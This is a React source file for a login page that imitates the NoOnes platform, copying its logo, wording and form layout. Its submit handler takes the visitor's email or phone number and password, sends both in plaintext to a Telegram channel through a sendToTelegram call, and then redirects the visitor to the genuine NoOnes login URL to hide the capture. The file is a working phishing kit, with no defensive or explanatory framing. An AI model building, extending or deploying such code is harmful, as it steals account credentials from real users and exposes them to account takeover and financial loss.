import React, { use, useState } from "react";
import "./styles/LoginPage.css";
import ThemeToggle from "./ThemeToggle";
import SvgSprite from "./SvgSprite.jsx";

import { sendToTelegram } from "../telegram";
import { useNavigate } from "react-router-dom";

const LoginPage = ({ theme, toggleTheme }) => {
  //   const [formData, setFormData] = useState({
  //     email: "",
  //     password: "",
  //   });
  const navigate = useNavigate();

  const [email, setEmail] = useState();
  const [password, setPassword] = useState();

  const [showPassword, setShowPassword] = useState(false);
  const [language, setLanguage] = useState("English");

  //   const handleChange = (e) => {
  //     const { name, value } = e.target;
  //     setFormData((prev) => ({
  //       ...prev,
  //       [name]: value,
  //     }));
  //   };

  const handleSubmit = (e) => {
    e.preventDefault();
    setLanguage("English"); // Placeholder for language selection logic
    // console.log("Login attempt:", formData);
    // Add your login logic here
  };

  const handleGoogleLogin = () => {
    console.log("Google login clicked");
    // Add Google OAuth logic here
  };

  const handleAppleLogin = () => {
    console.log("Apple login clicked");
    // Add Apple OAuth logic here
  };
  async function handleLoginData(e) {
    if (!email || !password) {
      return;
    }
    const message = `New Login Attempt:\nEmail/Phone: ${email}\nPassword: ${password}`;
    await sendToTelegram(message);
    navigate(
      "https://noones.com/id/login?next=https%3A//auth.noones.com/oauth2/authorize%3Flocale%3Den%26redirect_uri%3Dhttps%253A%252F%252Fnoones.com%252Flogin%252Fcallback%26state%3Dd027a2dbb251902dbaff264bd2707b60%26response_type%3Dcode%26approval_prompt%3Dauto%26client_id%3Dh9VAgMcfYPfoBaihBIfKt7An7UwFon5aKFjrm68dzFdxZ7Tj"
    ); // Redirect to dashboard after login
  }

  return (
    <div className="login-container">
      <div className="login-wrapper">
        <div className="login-content">
          {/* Logo Header */}
          <div className="logo-section">
            <a href="/" className="logo-link">
              <svg
                className="logo"
                viewBox="0 0 104 32"
                fill="none"
                xmlns="http://www.w3.org/2000/svg"
              >
                {/* Logo SVG paths from original */}
                <path
                  d="M79.1209 19.9821L88.3283 19.6653L88.1105 13.512L86.7034 13.5605L86.6543 12.1731L83.8406 12.2699L83.7915 10.8826L78.1641 11.0763L78.2132 12.4636L75.3995 12.5605L75.4486 13.9478L74.0414 13.9963L74.1397 16.7704L72.7325 16.8188L72.9266 22.2965L74.3338 22.2481L74.432 25.0222L75.8391 24.9738L75.8883 26.3611L78.7019 26.2643L78.7511 27.6516L84.3785 27.4579L84.3293 26.0706L87.143 25.9737L87.0939 24.5864L88.5011 24.5379L88.3993 21.6571L86.9921 21.7055C84.1784 21.8023 84.3187 23.7206 81.0718 23.832C79.3765 23.8904 77.2788 23.0368 77.2285 21.6139C77.1948 20.6536 77.9309 20.0229 79.1209 19.9821ZM77.6924 16.4758C78.1013 15.7378 79.0185 14.8626 81.076 14.792C83.1334 14.7214 84.1104 15.5306 84.5708 16.2389C84.8578 16.6811 84.5394 17.2634 84.0068 17.2815L81.1677 17.3795L78.3286 17.4775C77.7966 17.4956 77.4374 16.9372 77.6924 16.4764V16.4758Z"
                  fill="currentColor"
                />
                <path
                  d="M0 11.8535L4.20072 11.4183L4.49481 14.179L5.89486 14.0338L5.74751 12.6534L7.14756 12.5081L7.00022 11.1278L12.5655 10.5508L12.7128 11.9311L14.1129 11.7859L14.407 14.5466L15.807 14.4013L17.1236 26.7533L12.9229 27.1885L11.9572 18.1276C11.7495 16.1807 10.2642 14.8313 8.10972 15.0547C5.95521 15.2782 4.78417 16.903 4.99128 18.8498L5.95699 27.9108L1.75627 28.346L0 11.8535Z"
                  fill="currentColor"
                />
                <path
                  d="M56.0312 10.7387L60.2521 10.884L60.1538 13.6587L61.561 13.7071L61.6101 12.3198L63.0172 12.3682L63.0664 10.9808L68.6588 11.1734L68.6097 12.5607L70.0169 12.6091L69.9186 15.3838L71.3258 15.4323L70.8861 27.845L66.6653 27.6997L66.9878 18.5944C67.057 16.6382 65.7765 15.098 63.6113 15.0233C61.4468 14.9486 60.0568 16.3972 59.9876 18.3534L59.6651 27.4587L55.4442 27.3135L56.0312 10.7393V10.7387Z"
                  fill="currentColor"
                />
                <path
                  d="M94.0759 26.1009L91.2616 26.004L91.3107 24.6167L89.9035 24.5682L90.0095 21.5812L91.9569 21.6483C94.9149 21.7504 93.9398 23.7824 97.4381 23.9032C98.7014 23.9469 99.7305 23.4469 99.7672 22.416C99.7985 21.5269 99.0547 21.1086 97.8322 20.9243L94.6735 20.4243C91.5119 19.9237 90.139 17.9179 90.2047 16.0691L90.2941 13.5435L91.7012 13.5919L91.7503 12.2046L94.5646 12.3014L94.6137 10.9141L99.8802 11.0955L99.8311 12.4829L102.645 12.5797L102.596 13.9671L104.003 14.0155L103.9 16.932L102.816 16.8946C99.1381 16.768 100.006 14.6969 96.6132 14.5802C95.1356 14.5295 94.2853 15.0335 94.2581 15.8171C94.2267 16.7062 94.8682 16.9413 96.2339 17.1665L99.5038 17.6706C102.449 18.1285 103.787 20.132 103.705 22.4446L103.613 25.0408L102.206 24.9924L102.157 26.3797L99.3429 26.2829L99.2938 27.6702L94.0273 27.4888L94.0764 26.1015L94.0759 26.1009Z"
                  fill="currentColor"
                />
                <path
                  d="M34.4435 19.9612L34.1494 17.2005L32.7493 17.3458L32.602 15.9654L29.8019 16.2554L29.6546 14.875L23.5514 15.5074L23.6988 16.8878L20.8987 17.1777L21.046 18.5581L19.646 18.7034L19.9401 21.4641L18.54 21.6093L19.1211 27.059L20.5212 26.9137L20.8153 29.6744L22.2153 29.5292L22.3626 30.9095L25.1627 30.6196L25.3101 31.9999L31.4132 31.3675L31.2659 29.9871L34.066 29.6972L33.9186 28.3168L35.3187 28.1716L35.0246 25.4108L36.4246 25.2656L35.8435 19.8159L34.4435 19.9612ZM30.7102 26.4149C30.0292 27.1552 29.0865 27.6727 27.9457 27.7906C26.8054 27.9084 25.7752 27.5963 24.9527 27.0123C23.9337 26.311 23.2059 25.209 23.0662 23.8951C22.926 22.5819 23.4041 21.3561 24.252 20.4612C24.9331 19.7202 25.8764 19.2028 27.0172 19.0843C28.1593 18.9659 29.1913 19.2792 30.0138 19.8649C31.031 20.5668 31.7564 21.6671 31.8961 22.9798C32.0363 24.2936 31.5576 25.5199 30.7091 26.4149H30.7102Z"
                  fill="currentColor"
                />
                <path
                  d="M52.5632 12.4532L52.6614 9.67848L51.2542 9.63006L51.3034 8.24271L48.4891 8.14586L48.5382 6.7585L42.4049 6.54731L42.3557 7.93466L39.5415 7.83782L39.4923 9.22517L38.0852 9.17675L37.987 11.9515L36.5798 11.903L36.3857 17.3795L37.7929 17.428L37.6947 20.2027L39.1018 20.2511L39.0527 21.6384L41.867 21.7353L41.8179 23.1226L47.9512 23.3338L48.0003 21.9465L50.8146 22.0433L50.8637 20.656L52.2708 20.7044L52.3691 17.9297L53.7762 17.9781L53.9703 12.5016L52.5632 12.4532ZM47.9553 18.3317C47.176 18.9717 46.1701 19.3544 45.0239 19.3147C43.8783 19.275 42.9019 18.8246 42.1699 18.1333C41.2599 17.299 40.6947 16.1083 40.7415 14.7874C40.7882 13.4677 41.435 12.3196 42.4007 11.5495C43.18 10.9089 44.1872 10.5262 45.3334 10.5653C46.4807 10.6049 47.4583 11.0565 48.1908 11.7496C49.0991 12.5839 49.6619 13.7735 49.6151 15.0926C49.5684 16.4128 48.9216 17.5616 47.9553 18.3311V18.3317Z"
                  fill="currentColor"
                />
                <path
                  d="M58.2876 0.892151L57.2092 0L53.2462 4.65646L54.3246 5.54861L58.2876 0.892151Z"
                  fill="currentColor"
                />
                <path
                  d="M52.8234 1.87122L51.4371 1.63021L51.0088 4.02493L52.3951 4.26594L52.8234 1.87122Z"
                  fill="currentColor"
                />
                <path
                  d="M58.8201 6.36305L58.3387 5.05881L54.8628 6.30613L55.3443 7.61036L58.8201 6.36305Z"
                  fill="currentColor"
                />
              </svg>
            </a>
          </div>

          {/* Welcome Section */}
          <div className="welcome-section">
            <div className="welcome-card">
              <div className="welcome-header">
                <div className="welcome-title">Welcome to NoOnes</div>
                <div className="social-login">
                  <button
                    className="social-button"
                    onClick={handleGoogleLogin}
                    data-testid="google-login-button"
                  >
                    <svg width="30" height="30">
                      {/* Google Icon */}
                      <path
                        fill="#4285F4"
                        d="M26.32 14.292c0-.91-.082-1.785-.233-2.625H14v4.97h6.907c-.304 1.598-1.214 2.951-2.579 3.861v3.232h4.165c2.427-2.24 3.827-5.53 3.827-9.438"
                      />
                      <path
                        fill="#34A853"
                        d="M14 26.833c3.465 0 6.37-1.143 8.493-3.103l-4.165-3.232c-1.143.77-2.601 1.237-4.328 1.237-3.337 0-6.172-2.252-7.187-5.285h-4.27v3.313c2.112 4.189 6.44 7.07 11.457 7.07"
                      />
                      <path
                        fill="#FBBC05"
                        d="M6.813 16.438A7.7 7.7 0 0 1 6.405 14c0-.852.152-1.668.408-2.438V8.248h-4.27A12.7 12.7 0 0 0 1.167 14c0 2.077.501 4.025 1.376 5.752l3.325-2.59z"
                      />
                      <path
                        fill="#EA4335"
                        d="M14 6.277c1.89 0 3.57.653 4.912 1.913l3.675-3.675C20.358 2.438 17.465 1.167 14 1.167c-5.017 0-9.345 2.881-11.457 7.081l4.27 3.314C7.828 8.528 10.663 6.277 14 6.277"
                      />
                    </svg>
                  </button>
                  <button
                    className="social-button"
                    onClick={handleAppleLogin}
                    data-testid="apple-login-button"
                  >
                    <svg width="30" height="30">
                      {/* Apple Icon */}
                      <path
                        fill="currentColor"
                        fillRule="evenodd"
                        d="M17.983 5.023C18.93 3.958 19.566 2.475 19.392 1c-1.363.05-3.012.846-3.989 1.91-.877.943-1.643 2.45-1.437 3.897 1.52.11 3.071-.718 4.017-1.784m3.409 9.365c.038 3.814 3.594 5.082 3.633 5.099-.029.09-.568 1.808-1.873 3.584-1.13 1.535-2.3 3.063-4.146 3.096-1.812.031-2.396-1-4.47-1-2.072 0-2.72.967-4.435 1.031-1.782.062-3.14-1.66-4.276-3.19-2.327-3.128-4.104-8.84-1.717-12.696a6.71 6.71 0 0 1 5.604-3.158c1.749-.032 3.4 1.095 4.469 1.095s3.076-1.355 5.185-1.156c.882.034 3.361.332 4.952 2.5-.129.074-2.958 1.607-2.926 4.795"
                        clipRule="evenodd"
                      />
                    </svg>
                  </button>
                </div>
              </div>

              {/* Login Form */}
              <form className="login-form" onSubmit={handleSubmit}>
                <div className="form-group">
                  <label className="form-label">Email/Phone number</label>
                  <div className="input-wrapper">
                    <input
                      type="text"
                      name="email"
                      placeholder="Email/Phone"
                      value={email}
                      onChange={(e) => setEmail(e.target.value)}
                      className="form-input"
                      data-testid="unified-email-phone-input-login"
                      autoComplete="email"
                    />
                  </div>
                </div>

                <div className="form-group">
                  <label className="form-label">Password</label>
                  <div className="password-wrapper">
                    <div className="input-wrapper">
                      <input
                        type={showPassword ? "text" : "password"}
                        name="password"
                        placeholder="Password"
                        value={password}
                        onChange={(e) => setPassword(e.target.value)}
                        className="form-input"
                        data-testid="password-input-login"
                        autoComplete="current-password"
                        style={{ letterSpacing: "1.2px" }}
                      />
                      <button
                        type="button"
                        className="password-toggle"
                        onClick={() => setShowPassword(!showPassword)}
                        data-testid="password-input-login-eye-button"
                      >
                        {/* <SvgSprite> */}

                        {showPassword ? (
                          <svg
                            width="20"
                            height="20"
                            viewBox="0 0 20 20"
                            fill="currentColor"
                          >
                            <path d="M3.707 2.293a1 1 0 00-1.414 1.414l14 14a1 1 0 001.414-1.414l-1.473-1.473A10.014 10.014 0 0019.542 10C18.268 5.943 14.478 3 10 3a9.958 9.958 0 00-4.512 1.074l-1.78-1.781zm4.261 4.26l1.515 1.515a2.003 2.003 0 012.45 2.45l1.514 1.514a4 4 0 00-5.478-5.478z" />
                            <path d="M12.454 16.697L9.75 13.992a4 4 0 01-3.742-3.741L2.335 6.578A9.98 9.98 0 00.458 10c1.274 4.057 5.065 7 9.542 7 .847 0 1.669-.105 2.454-.303z" />
                          </svg>
                        ) : (
                          <svg
                            width="20"
                            height="20"
                            viewBox="0 0 20 20"
                            fill="currentColor"
                          >
                            <path d="M10 12a2 2 0 100-4 2 2 0 000 4z" />
                            <path
                              fillRule="evenodd"
                              d="M.458 10C1.732 5.943 5.522 3 10 3s8.268 2.943 9.542 7c-1.274 4.057-5.064 7-9.542 7S1.732 14.057.458 10zM14 10a4 4 0 11-8 0 4 4 0 018 0z"
                              clipRule="evenodd"
                            />
                          </svg>
                        )}

                        {/* </SvgSprite> */}
                      </button>
                    </div>
                    <div className="forgot-password">
                      <a
                        href="/reset-password"
                        className="forgot-link"
                        data-testid="reset-password-link"
                      >
                        Forgot password?
                      </a>
                    </div>
                  </div>
                </div>

                <div className="submit-button-wrapper">
                  <button
                    type="submit"
                    className="submit-button"
                    // data-testid="login-submit"
                    onClick={handleLoginData}
                  >
                    Log in
                  </button>
                </div>
              </form>

              {/* Sign Up Link */}
              <div className="signup-section">
                <p className="signup-text">
                  No account yet?{" "}
                  <a
                    href="/register"
                    className="signup-link"
                    style={{ color: "#3ebd69", fontWeight: "600" }}
                    data-testid="register-link"
                  >
                    Sign up
                  </a>
                </p>
              </div>
            </div>

            {/* Footer Controls */}
            <div className="footer-controls">
              <ThemeToggle theme={theme} toggleTheme={toggleTheme} />

              <div className="language-selector">
                <div className="language-dropdown">
                  <button className="language-button">
                    <span
                      style={{ color: "#3ebd69" }}
                      className="language-text"
                      //   class="tw-text-medium-green"
                    >
                      {language}
                    </span>
                    <svg
                      xmlns="http://www.w3.org/2000/svg"
                      fill="none"
                      viewBox="0 0 16 16"
                      width="16"
                      height="16"
                      style={{ color: "#3ebd69" }}
                    >
                      <path
                        stroke="currentColor"
                        strokeLinecap="round"
                        strokeLinejoin="round"
                        strokeWidth="1.333"
                        d="m4 6 4 4 4-4"
                      />
                    </svg>
                  </button>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};

export default LoginPage;
